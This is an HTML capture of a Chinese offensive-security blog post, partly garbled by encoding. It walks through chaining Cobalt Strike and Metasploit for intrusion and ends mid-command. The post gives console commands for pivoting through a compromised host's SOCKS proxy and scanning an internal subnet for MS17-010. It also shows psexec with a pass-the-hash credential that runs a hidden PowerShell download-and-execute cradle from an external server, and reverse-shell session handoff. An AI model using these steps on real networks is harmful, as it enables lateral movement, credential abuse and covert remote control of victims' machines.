<!-- build time:Thu Dec 12 2019 00:36:22 GMT+0800 (GMT+08:00) --><!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,minimal-ui"><meta name="renderer" content="webkit"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no,email=no,adress=no"><meta name="theme-color" content="#000000"><meta http-equiv="window-target" content="_top"><title>CobaltStrikeä¸Metasploitå®æˆ˜è”åŠ¨ | AnonySec&#39;Blog</title><meta name="description" content="å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚â€”â€”AnonySechttps:&#x2F;&#x2F;payloads.cnå‰è¨€CobalStrike ä¸ Metasploit å‡æ˜¯æ¸—é€åˆ©å™¨ï¼Œå„æœ‰æ‰€é•¿ã€‚å‰è€…æ›´é€‚åˆåšç¨³æ§å¹³å°ï¼Œåè€…åˆ™æ›´æ“…é•¿å†…ç½‘å„ç±»æ¢æµ‹æœé›†ä¸æ¼æ´åˆ©ç”¨ã€‚ä¸¤è€…æ›´éœ€è¦çµæ´»çš„è”åŠ¨ï¼Œå„è‡ªç›¸äº’ä¾æ‰˜ï¼Œä»è€Œæå‡æ¸—é€çš„æ•ˆç‡ã€‚å†…ç½®SocksåŠŸèƒ½é€šè¿‡Beaconå†…ç½®çš„socksåŠŸèƒ½åœ¨VPSä¸Šå¼€å¯ä»£ç†ç«¯å£ï¼Œæ‰“é€šç›®æ ‡å†…ç½‘é€šé“ï¼Œä¹‹åå°†"><meta name="keywords" content="CobaltStrike"><meta property="og:type" content="article"><meta property="og:title" content="CobaltStrikeä¸Metasploitå®æˆ˜è”åŠ¨"><meta property="og:url" content="https:&#x2F;&#x2F;payloads.cn&#x2F;2019&#x2F;1211&#x2F;cobaltstrike-and-metasploit-combat-linkage.html"><meta property="og:site_name" content="AnonySec&#39;Blog"><meta property="og:description" content="å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚â€”â€”AnonySechttps:&#x2F;&#x2F;payloads.cnå‰è¨€CobalStrike ä¸ Metasploit å‡æ˜¯æ¸—é€åˆ©å™¨ï¼Œå„æœ‰æ‰€é•¿ã€‚å‰è€…æ›´é€‚åˆåšç¨³æ§å¹³å°ï¼Œåè€…åˆ™æ›´æ“…é•¿å†…ç½‘å„ç±»æ¢æµ‹æœé›†ä¸æ¼æ´åˆ©ç”¨ã€‚ä¸¤è€…æ›´éœ€è¦çµæ´»çš„è”åŠ¨ï¼Œå„è‡ªç›¸äº’ä¾æ‰˜ï¼Œä»è€Œæå‡æ¸—é€çš„æ•ˆç‡ã€‚å†…ç½®SocksåŠŸèƒ½é€šè¿‡Beaconå†…ç½®çš„socksåŠŸèƒ½åœ¨VPSä¸Šå¼€å¯ä»£ç†ç«¯å£ï¼Œæ‰“é€šç›®æ ‡å†…ç½‘é€šé“ï¼Œä¹‹åå°†"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="http:&#x2F;&#x2F;img.payloads.cn&#x2F;blog&#x2F;2019-12-10-165921.png"><meta property="og:image" content="http:&#x2F;&#x2F;img.payloads.cn&#x2F;blog&#x2F;2019-12-10-165926.png"><meta property="og:image" content="http:&#x2F;&#x2F;img.payloads.cn&#x2F;blog&#x2F;2019-12-04-101356.jpg"><meta property="og:image" content="http:&#x2F;&#x2F;img.payloads.cn&#x2F;blog&#x2F;2019-12-10-165938.png"><meta property="og:image" content="http:&#x2F;&#x2F;img.payloads.cn&#x2F;blog&#x2F;2019-12-10-165946.png"><meta property="og:image" content="http:&#x2F;&#x2F;img.payloads.cn&#x2F;blog&#x2F;2019-12-04-101361.jpg"><meta property="og:image" content="http:&#x2F;&#x2F;img.payloads.cn&#x2F;blog&#x2F;2019-12-04-101405.jpg"><meta property="og:image" content="http:&#x2F;&#x2F;img.payloads.cn&#x2F;blog&#x2F;2019-12-04-101362.jpg"><meta property="og:image" content="http:&#x2F;&#x2F;img.payloads.cn&#x2F;blog&#x2F;2019-12-04-101340.jpg"><meta property="og:image" content="http:&#x2F;&#x2F;img.payloads.cn&#x2F;blog&#x2F;2019-12-04-101408.jpg"><meta property="og:image" content="http:&#x2F;&#x2F;img.payloads.cn&#x2F;blog&#x2F;2019-12-04-101359.jpg"><meta property="og:image" content="http:&#x2F;&#x2F;img.payloads.cn&#x2F;blog&#x2F;2019-12-04-101342.jpg"><meta property="og:image" content="http:&#x2F;&#x2F;img.payloads.cn&#x2F;blog&#x2F;2019-12-04-101341.jpg"><meta property="og:updated_time" content="2019-12-11T02:01:37.783Z"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="http:&#x2F;&#x2F;img.payloads.cn&#x2F;blog&#x2F;2019-12-10-165921.png"><link rel="canonical" href="https://payloads.cn/2019/1211/cobaltstrike-and-metasploit-combat-linkage.html"><link rel="alternate" href="/atom.xml" title="AnonySec&#39;Blog" type="application/atom+xml"><link rel="icon" href="/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><meta name="generator" content="Hexo 4.0.0"></head><body class="main-center" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="slimContent"><div class="navbar-header"><div class="profile-block text-center"><a id="avatar" href="https://github.com/An0nySec/" target="_blank"><img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200"></a><h2 id="name" class="hidden-xs hidden-sm">AnonySec</h2><h3 id="title" class="hidden-xs hidden-sm hidden-md"></h3><small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> China</small></div><div class="search" id="search-form-wrap"><form class="search-form sidebar-form"><div class="input-group"><input type="text" class="search-form-input form-control" placeholder="æœç´¢"> <span class="input-group-btn"><button type="submit" class="search-form-submit btn btn-flat" onclick="return!1"><i class="icon icon-search"></i></button></span></div></form><div class="ins-search"><div class="ins-search-mask"></div><div class="ins-search-container"><div class="ins-input-wrapper"><input type="text" class="ins-search-input" placeholder="æƒ³è¦æŸ¥æ‰¾ä»€ä¹ˆ..." x-webkit-speech> <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">Ã—</span></button></div><div class="ins-section-wrapper"><div class="ins-section-container"></div></div></div></div></div><button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false"><span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span></button></div><nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation"><ul class="nav navbar-nav main-nav menu-highlight"><li class="menu-item menu-item-home"><a href="/."><i class="icon icon-home-fill"></i> <span class="menu-title">é¦–é¡µ</span></a></li><li class="menu-item menu-item-archives"><a href="/archives"><i class="icon icon-archives-fill"></i> <span class="menu-title">å½’æ¡£</span></a></li><li class="menu-item menu-item-categories"><a href="/categories"><i class="icon icon-folder"></i> <span class="menu-title">åˆ†ç±»</span></a></li><li class="menu-item menu-item-tags"><a href="/tags"><i class="icon icon-tags"></i> <span class="menu-title">æ ‡ç­¾</span></a></li><li class="menu-item menu-item-about"><a href="/about"><i class="icon icon-cup-fill"></i> <span class="menu-title">å…³äº</span></a></li></ul><ul class="social-links"><li><a href="https://github.com/An0nySec/" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li><li><a href="/atom.xml" target="_blank" title="Rss" data-toggle="tooltip" data-placement="top"><i class="icon icon-rss"></i></a></li></ul></nav></div></header><aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><div class="widget"><h3 class="widget-title">å…¬å‘Š</h3><div class="widget-body"><div id="board"><div class="content"><h5>ğŸ’» æ¬¢è¿åŠ å…¥å…è´¹æŠ€æœ¯å¯†åœˆ ğŸ’»</h5><img src="/xq.jpg"></div></div></div></div><div class="widget"><h3 class="widget-title">åˆ†ç±»</h3><div class="widget-body"><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Tools/">Tools</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%90%9C%E9%9B%86/">å†…ç½‘å¯†ç æœé›†</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">æƒé™ç»´æŒ</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%92%93%E9%B1%BC/">é’“é±¼</a><span class="category-list-count">1</span></li></ul></div></div><div class="widget"><h3 class="widget-title">æ ‡ç­¾</h3><div class="widget-body"><ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CobaltStrike/" rel="tag">CobaltStrike</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Office/" rel="tag">Office</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows%E5%90%8E%E9%97%A8/" rel="tag">Windowsåé—¨</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" rel="tag">å†…ç½‘ç©¿é€</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%A7%A3%E5%AF%86%E5%AE%A2%E6%88%B7%E7%AB%AF/" rel="tag">è§£å¯†å®¢æˆ·ç«¯</a><span class="tag-list-count">2</span></li></ul></div></div><div class="widget"><h3 class="widget-title">å½’æ¡£</h3><div class="widget-body"><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">åäºŒæœˆ 2019</a><span class="archive-list-count">7</span></li></ul></div></div><div class="widget"><h3 class="widget-title">æœ€æ–°æ–‡ç« </h3><div class="widget-body"><ul class="recent-post-list list-unstyled no-thumbnail"><li><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/Tools/">Tools</a></p><p class="item-title"><a href="/2019/1211/cobaltstrike-and-metasploit-combat-linkage.html" class="title">CobaltStrikeä¸Metasploitå®æˆ˜è”åŠ¨</a></p><p class="item-date"><time datetime="2019-12-10T16:22:29.000Z" itemprop="datePublished">2019-12-11</time></p></div></li><li><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/%E9%92%93%E9%B1%BC/">é’“é±¼</a></p><p class="item-title"><a href="/2019/1209/basic-use-of-office-macros.html" class="title">Officeå®çš„åŸºæœ¬åˆ©ç”¨</a></p><p class="item-date"><time datetime="2019-12-09T06:35:09.000Z" itemprop="datePublished">2019-12-09</time></p></div></li><li><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">æƒé™ç»´æŒ</a></p><p class="item-title"><a href="/2019/1205/shfit-image-hijacks-backdoor-new-gameplay.html" class="title">Shfitæ˜ åƒåŠ«æŒåé—¨æ–°ç©æ³•</a></p><p class="item-date"><time datetime="2019-12-05T05:08:11.000Z" itemprop="datePublished">2019-12-05</time></p></div></li><li><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%90%9C%E9%9B%86/">å†…ç½‘å¯†ç æœé›†</a></p><p class="item-title"><a href="/2019/1204/decrypt-password-hash-saved-in-winscp-client.html" class="title">è§£å¯†Winscpå®¢æˆ·ç«¯ä¸­ä¿å­˜çš„å¯†ç hash</a></p><p class="item-date"><time datetime="2019-12-04T14:08:50.000Z" itemprop="datePublished">2019-12-04</time></p></div></li><li><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%90%9C%E9%9B%86/">å†…ç½‘å¯†ç æœé›†</a></p><p class="item-title"><a href="/2019/1204/decrypt-the-password-hash-stored-in-securecrt-client.html" class="title">è§£å¯†SecureCRTå®¢æˆ·ç«¯ä¸­ä¿å­˜çš„å¯†ç hash</a></p><p class="item-date"><time datetime="2019-12-04T14:08:30.000Z" itemprop="datePublished">2019-12-04</time></p></div></li></ul></div></div></div></aside><aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><nav id="toc" class="article-toc"><h3 class="toc-title">æ–‡ç« ç›®å½•</h3><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#å‰è¨€"><span class="toc-number">1.</span> <span class="toc-text">å‰è¨€</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#å†…ç½®SocksåŠŸèƒ½"><span class="toc-number">2.</span> <span class="toc-text">å†…ç½®SocksåŠŸèƒ½</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#åˆ©ç”¨MSFæ¨¡å—ä¸Šçº¿Beacon-shell"><span class="toc-number">3.</span> <span class="toc-text">åˆ©ç”¨MSFæ¨¡å—ä¸Šçº¿Beacon shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSä¸MSFä¼šè¯äº’ä¼ "><span class="toc-number">4.</span> <span class="toc-text">CSä¸MSFä¼šè¯äº’ä¼ </span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CobaltStrikeæ´¾ç”ŸMetasploit"><span class="toc-number">4.1.</span> <span class="toc-text">CobaltStrikeæ´¾ç”ŸMetasploit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Metasploitæ´¾ç”ŸCobaltStrike"><span class="toc-number">4.2.</span> <span class="toc-text">Metasploitæ´¾ç”ŸCobaltStrike</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#æ€»ç»“"><span class="toc-number">5.</span> <span class="toc-text">æ€»ç»“</span></a></li></ol></nav></div></aside><main class="main" role="main"><div class="content"><article id="post-CobaltStrikeä¸Metasploitå®æˆ˜è”åŠ¨" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting"><div class="article-header"><h1 class="article-title" itemprop="name">CobaltStrikeä¸Metasploitå®æˆ˜è”åŠ¨</h1><div class="article-meta"><span class="article-date"><i class="icon icon-calendar-check"></i> <a href="/2019/1211/cobaltstrike-and-metasploit-combat-linkage.html" class="article-date"><time datetime="2019-12-10T16:22:29.000Z" itemprop="datePublished">2019-12-11</time></a></span> <span class="article-category"><i class="icon icon-folder"></i> <a class="article-category-link" href="/categories/Tools/">Tools</a></span> <span class="article-tag"><i class="icon icon-tags"></i> <a class="article-tag-link" href="/tags/CobaltStrike/" rel="tag">CobaltStrike</a></span> <span class="article-read hidden-xs"><i class="icon icon-eye-fill" aria-hidden="true"></i> <span id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv">0</span></span></span> <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2019/1211/cobaltstrike-and-metasploit-combat-linkage.html#comments" class="article-comment-link">è¯„è®º</a></span> <span class="post-wordcount hidden-xs" itemprop="wordCount">å­—æ•°ç»Ÿè®¡: 1.1k(å­—)</span> <span class="post-readcount hidden-xs" itemprop="timeRequired">é˜…è¯»æ—¶é•¿: 4(åˆ†)</span></div></div><div class="article-entry marked-body" itemprop="articleBody"><blockquote><p>å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚</p><p>â€”â€”AnonySec</p><p><a href="https://payloads.cn">https://payloads.cn</a></p></blockquote><h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>CobalStrike ä¸ Metasploit å‡æ˜¯æ¸—é€åˆ©å™¨ï¼Œå„æœ‰æ‰€é•¿ã€‚å‰è€…æ›´é€‚åˆåšç¨³æ§å¹³å°ï¼Œåè€…åˆ™æ›´æ“…é•¿å†…ç½‘å„ç±»æ¢æµ‹æœé›†ä¸æ¼æ´åˆ©ç”¨ã€‚ä¸¤è€…æ›´éœ€è¦çµæ´»çš„è”åŠ¨ï¼Œå„è‡ªç›¸äº’ä¾æ‰˜ï¼Œä»è€Œæå‡æ¸—é€çš„æ•ˆç‡ã€‚</p><h3 id="å†…ç½®SocksåŠŸèƒ½"><a href="#å†…ç½®SocksåŠŸèƒ½" class="headerlink" title="å†…ç½®SocksåŠŸèƒ½"></a>å†…ç½®SocksåŠŸèƒ½</h3><p>é€šè¿‡Beaconå†…ç½®çš„socksåŠŸèƒ½åœ¨VPSä¸Šå¼€å¯ä»£ç†ç«¯å£ï¼Œæ‰“é€šç›®æ ‡å†…ç½‘é€šé“ï¼Œä¹‹åå°†æœ¬åœ°Metasploitç›´æ¥å¸¦å…¥ç›®æ ‡å†…ç½‘ï¼Œè¿›è¡Œæ¨ªå‘æ¸—é€ã€‚</p><p><del>å½“ç„¶ï¼Œä¹Ÿå¯ä»¥æŠŠä»£ç†è®¾ç½®åœ¨å…¶ä»–çš„å·¥å…·ä¸Šï¼Œä¸é™äºProxychainsã€Proxifierç­‰</del>ã€‚</p><p>é¦–å…ˆï¼Œåˆ°å·²æ§ç›®æ ‡æœºçš„Beaconä¸‹å°†socksä»£ç†å¼€å¯ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">beacon &gt; socks 1024 <span class="comment">#ç«¯å£æ ¹æ®VPSå®é™…æƒ…å†µè¿›è¡Œè®¾ç½®</span></span></pre></td></tr></table></figure><img src="http://img.payloads.cn/blog/2019-12-10-165921.png" alt="image-20191101135627154" style="zoom:50%"><p>ç‚¹å¼€èœå•æ ä¸­çš„<code>View &gt; Proxy Pivots</code>ï¼Œå¤åˆ¶ä»£ç†è¿æ¥åˆ°Metasploitä¸­ã€‚</p><p><img src="http://img.payloads.cn/blog/2019-12-10-165926.png" alt="image-20191210220800309"></p><p>æœ¬åœ°å¯åŠ¨Metasploitï¼ŒæŒ‚ä¸Šä»£ç†ï¼Œå°±å¯ä»¥å¯¹ç›®æ ‡å†…ç½‘è¿›è¡Œå„ç§æ¢æµ‹æœé›†ã€‚å¦‚ æ¢æµ‹ç›®æ ‡å†…ç½‘ä¸­å­˜åœ¨MS17_010æ¼æ´çš„ä¸»æœºï¼Œè¿™ä¹Ÿæ˜¯å†…ç½‘æ‹¿ä¸»æœºæƒé™åˆ©ç”¨æ–¹å¼ä¹‹ä¸€ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">msf5 &gt; setg Proxies socks4/5:ip:port <span class="comment">#è®©msfæ‰€æœ‰æ¨¡å—çš„æµé‡éƒ½é€šè¿‡æ­¤ä»£ç†èµ°ã€‚(setgå…¨å±€è®¾ç½®)</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">msf5 &gt; setg ReverseAllowProxy <span class="literal">true</span> <span class="comment">#å…è®¸åå‘ä»£ç†ï¼Œé€šè¿‡socksåå¼¹shellï¼Œå»ºç«‹åŒå‘é€šé“ã€‚(æ¢æµ‹å¯ä»¥ä¸è®¾ç½®æ­¤é¡¹)</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/scanner/smb/smb_ms17_010</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">msf5 &gt; <span class="built_in">set</span> rhosts 192.168.144.0/24</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">msf5 &gt; <span class="built_in">set</span> threads 100 <span class="comment">#å†…ç½‘æ¸—é€æ—¶çº¿ç¨‹ä¸è¦å¤ªé«˜ï¼</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">msf5 &gt; run</span></pre></td></tr></table></figure><p><img src="http://img.payloads.cn/blog/2019-12-04-101356.jpg" alt="image-20191031212332738"></p><h3 id="åˆ©ç”¨MSFæ¨¡å—ä¸Šçº¿Beacon-shell"><a href="#åˆ©ç”¨MSFæ¨¡å—ä¸Šçº¿Beacon-shell" class="headerlink" title="åˆ©ç”¨MSFæ¨¡å—ä¸Šçº¿Beacon shell"></a>åˆ©ç”¨MSFæ¨¡å—ä¸Šçº¿Beacon shell</h3><p>å½“é€šè¿‡å…¶å®ƒæ–¹å¼æ‹¿åˆ°äº†ç›®æ ‡å†…ç½‘ä¸­æŸå°Windowsæœºå™¨çš„æœ¬åœ°ç®¡ç†å‘˜æ˜æ–‡å¯†ç æˆ–hashæ—¶ï¼Œå¯åˆ©ç”¨Metasploitä¸‹<code>auxiliary/admin/smb/psexec_command</code>æ¨¡å—ï¼Œç›´æ¥ä¸Šçº¿æŒ‡å®šç›®æ ‡æœºå™¨çš„Beacon shellã€‚<strong>(å‰æç›®æ ‡æœºå¯å‡ºç½‘)</strong></p><p>å…ˆåˆ©ç”¨CobalStrikeç”Ÿæˆä¸Šçº¿Beaconçš„powershellã€‚</p><p><img src="http://img.payloads.cn/blog/2019-12-10-165938.png" alt="image-20191210233357244"></p><p>æœ¬åœ°å¯åŠ¨Metasploitï¼ŒæŒ‚ä¸Šä»£ç†ï¼Œè®¾ç½®<code>psexec_command</code>æ¨¡å—å‚æ•°ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">msf5 &gt; setg Proxies socks4/5:ip:port</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/admin/smb/psexec_command</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">msf5 &gt; <span class="built_in">set</span> rhosts 192.168.144.0/24</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">msf5 &gt; <span class="built_in">set</span> threads 10</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">msf5 &gt; <span class="built_in">set</span> smbuser administrator</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">msf5 &gt; <span class="built_in">set</span> smbpass aad3b435b51404eeaad3b435b51404ee:579da618cfbfa85247acf1f800a280a4 <span class="comment">#æ˜æ–‡ã€å¯†æ–‡å‡å¯</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">msf5 &gt; <span class="built_in">set</span> <span class="built_in">command</span> powershell.exe -nop -w hidden -c <span class="string">"IEX ((new-object net.webclient).downloadstring('http://149.28.xx.xx:80/a'))"</span> <span class="comment">#ä¸Šçº¿CSçš„powershellï¼Œç›®æ ‡æœºå­˜åœ¨æ€è½¯éœ€è€ƒè™‘</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">msf5 &gt; run</span></pre></td></tr></table></figure><p><img src="http://img.payloads.cn/blog/2019-12-10-165946.png" alt="image-20191210230311310"></p><p>æœ€ç»ˆï¼Œåªè¦å¯†ç ä¸€è‡´ã€ èƒ½å‡ºç½‘ï¼Œä¸”æœªè¢«æ€è½¯é˜»æ­¢çš„å‡ä¼šæˆåŠŸä¸Šçº¿ã€‚</p><h3 id="CSä¸MSFä¼šè¯äº’ä¼ "><a href="#CSä¸MSFä¼šè¯äº’ä¼ " class="headerlink" title="CSä¸MSFä¼šè¯äº’ä¼ "></a>CSä¸MSFä¼šè¯äº’ä¼ </h3><h4 id="CobaltStrikeæ´¾ç”ŸMetasploit"><a href="#CobaltStrikeæ´¾ç”ŸMetasploit" class="headerlink" title="CobaltStrikeæ´¾ç”ŸMetasploit"></a>CobaltStrikeæ´¾ç”ŸMetasploit</h4><p>å½“CobaltStrikeè·å¾—äº†ä¸€ä¸ªä¸Šçº¿æœºå™¨ï¼Œæƒ³æŠŠè¿™ä¸ªç›®æ ‡ä¼ ç»™Metasploitä¸­çš„meterpreterï¼Œè·å¾—ä¸€ä¸ªsessionè¿›è¡Œæ§åˆ¶ã€‚åœ¨Metasploitæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">msf5 &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp <span class="comment">#ä¸è¦ç”¨x64çš„payload</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">msf5 &gt; <span class="built_in">set</span> lhost 10.11.42.99</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">msf5 &gt; <span class="built_in">set</span> lport 5353</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">msf5 &gt; run -j</span></pre></td></tr></table></figure><img src="http://img.payloads.cn/blog/2019-12-04-101361.jpg" alt="image-20191021161800914" style="zoom:50%"><p>ä¹‹åä½¿ç”¨CobaltStrikeåˆ›å»ºä¸€ä¸ª<code>windows/foreign/reverse_tcp</code>çš„Listenerã€‚å…¶ä¸­IPä¸ºMetasploitçš„ç›‘å¬åœ°å€ï¼Œç«¯å£ä¸ºMetasploitæ‰€ç›‘å¬çš„ç«¯å£ã€‚</p><img src="http://img.payloads.cn/blog/2019-12-04-101405.jpg" alt="image-20191021162507473" style="zoom:50%"><p>ç„¶åé€‰ä¸­è®¡ç®—æœºï¼Œå³é”®-&gt;Spawnï¼šé€‰æ‹©MSFçš„ç›‘å¬å™¨ï¼š</p><p><img src="http://img.payloads.cn/blog/2019-12-04-101362.jpg" alt="image-20191203200239148"></p><p>è¿™ä¸ªæ—¶å€™å¯ä»¥çœ‹åˆ°ï¼ŒMetasploitä¸Šçš„ç›‘å¬å·²ç»ä¸Šçº¿ï¼Œç°åœ¨å¯ä»¥å¯¹meterpreterè·å¾—çš„sessionè¿›è¡Œæ§åˆ¶ã€‚</p><p><img src="http://img.payloads.cn/blog/2019-12-04-101340.jpg" alt="image-20191021163101989"></p><h4 id="Metasploitæ´¾ç”ŸCobaltStrike"><a href="#Metasploitæ´¾ç”ŸCobaltStrike" class="headerlink" title="Metasploitæ´¾ç”ŸCobaltStrike"></a>Metasploitæ´¾ç”ŸCobaltStrike</h4><p>ç°åœ¨å·²ç»è·å¾—äº†ä¸€ä¸ªmeterpreterçš„sessionï¼ŒæŠŠsessionä¼ ç»™CobaltStrikeã€‚</p><img src="http://img.payloads.cn/blog/2019-12-04-101408.jpg" alt="image-20191021161002473" style="zoom:50%"><p>åœ¨CobaltStrikeä¸­åˆ›å»ºä¸€ä¸ªç›‘å¬è€…ï¼Œå’Œä¸Šä¸€æ­¥ç±»ä¼¼ï¼Œè¿™é‡Œhostéœ€è¦ä¿®æ”¹ä¸ºCobaltStrikeå®¢æˆ·ç«¯IPï¼Œåˆ›å»ºå¥½ä¹‹åä¾¿ç›‘å¬8099ç«¯å£ï¼Œç­‰å¾…ç€è¢«æ§æœºè¿æ¥ã€‚</p><p><img src="http://img.payloads.cn/blog/2019-12-04-101359.jpg" alt="image-20191021160546360"></p><p>æ¥ä¸‹æ¥ï¼ŒæŠŠmeterpreterè·å¾—çš„sessionè½¬äº¤ç»™CobaltStrikeï¼Œåœ¨Metasploitæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/<span class="built_in">local</span>/payload_inject </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">msf5 &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_http</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">msf5 &gt; <span class="built_in">set</span> lhost 192.168.144.174</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">msf5 &gt; <span class="built_in">set</span> lport 8099</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">msf5 &gt; <span class="built_in">set</span> DisablePayloadHandler <span class="literal">true</span>   </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">msf5 &gt; <span class="built_in">set</span> session 1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">msf5 &gt; 